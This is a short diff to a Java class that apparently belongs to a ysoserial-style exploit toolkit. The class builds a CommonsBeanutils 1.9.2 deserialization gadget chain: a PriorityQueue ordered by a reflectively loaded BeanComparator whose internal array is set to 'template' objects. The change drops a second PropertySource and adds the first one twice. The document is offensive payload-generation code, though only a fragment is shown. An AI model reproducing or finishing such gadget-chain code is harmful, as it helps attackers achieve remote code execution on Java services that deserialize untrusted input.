@@ -26,14 +26,7 @@ public class CommonsBeanutilsPropertySource_192 implements ObjectPayload<Queue<O
             }
 
         };
-        PropertySource propertySource2 = new PropertySource() {
 
-            @Override
-            public int getPriority() {
-                return 0;
-            }
-
-        };
 //        BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());
         StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
         Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
@@ -47,7 +40,7 @@ public class CommonsBeanutilsPropertySource_192 implements ObjectPayload<Queue<O
         PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);
 
         queue.add(propertySource1);
-        queue.add(propertySource2);
+        queue.add(propertySource1);
 
 
         Reflections.setFieldValue(queue, "queue", new Object[] { template, template });
